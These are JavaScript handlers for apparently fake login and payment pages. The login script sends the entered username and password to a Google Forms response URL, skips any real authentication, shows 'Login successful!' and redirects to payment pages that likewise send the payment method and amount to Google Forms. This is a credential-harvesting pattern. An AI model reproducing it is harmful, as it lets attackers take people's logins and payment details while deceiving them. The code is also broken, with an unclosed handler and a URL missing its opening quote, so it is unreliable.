// login.html
document.getElementById('login-form').addEventListener('submit', (e) => {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const url = 'https://docs.google.com/forms/d/e/YOUR_FORM_ID/formResponse';
    const formData = new FormData();
    formData.append('entry.Your_Username_Field', username);
    formData.append('entry.Your_Password_Field', password);
    fetch(url, {
        method: 'POST',
        body: formData,
        mode: 'no-cors'
    })
    .then(() => {
        alert('Login successful!');
        window.location.href = 'processPay.html';
    })
    .catch((error) => {
        console.error(error);
    });


// processPay.html
document.getElementById('processPay-form').addEventListener('submit', (e) => {
    e.preventDefault();
    const paymentMethod = document.getElementById('payment-method').value;
    const amount = document.getElementById('amount').value;
    const url = https://docs.google.com/forms/d/e/1FAIpQLSeHfP8y35ZfpnAd21HD094g5sCrhbZa7EwcKcSY2typvVm1JQ/viewform?usp=dialog';
    const formData = new FormData();
    formData.append('entry.Your_Payment_Method_Field', paymentMethod);
    formData.append('entry.Your_Amount_Field', amount);
    fetch(url, {
        method: 'POST',
        body: formData,
        mode: 'no-cors'
    })
    .then(() => {
        alert('Payment processed!');
        window.location.href = 'payment.html';
    })
    .catch((error) => {
        console.error(error);
    });
});

// payment.html
document.getElementById('payment-form').addEventListener('submit', (e) => {
    e.preventDefault();
    const paymentMethod = document.getElementById('payment-method').value;
    const amount = document.getElementById('amount').value;
    const url = 'https://docs.google.com/forms/d/e/YOUR_FORM_ID/formResponse';
    const formData = new FormData();
    formData.append('entry.Your_Payment_Method_Field', paymentMethod);
    formData.append('entry.Your_Amount_Field', amount);
    fetch(url, {
        method: 'POST',
        body: formData,
        mode: 'no-cors'
    })
    .then(() => {
        alert('Payment successful!');
    })
    .catch((error) => {
        console.error(error);
    });
});
